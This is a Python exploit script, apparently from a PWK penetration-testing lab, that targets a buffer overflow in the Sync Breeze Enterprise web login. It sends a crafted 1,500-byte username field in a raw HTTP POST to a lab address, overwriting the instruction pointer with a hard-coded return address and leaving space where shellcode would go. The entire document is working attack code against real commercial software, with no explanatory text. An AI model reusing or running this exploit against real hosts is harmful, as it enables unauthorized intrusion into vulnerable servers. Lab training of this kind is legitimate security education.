#!/usr/bin/python
#PWK lab windows buffer overflow- Sync Breeze Enterprise
import socket
import sys

filler = "A" * 780
eip = "\x83\x0c\x09\x10"
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
inputBuffer = filler + eip + offset + buffer

try:
        print ("Sending evil buffer with %s bytes" %len(inputBuffer))
        
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.231.10\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://192.168.231.10/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        buffer += content
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.231.10", 80))
        s.send(buffer)
        s.close()   
except:
        print ("Could not connect!")
        sys.exit()

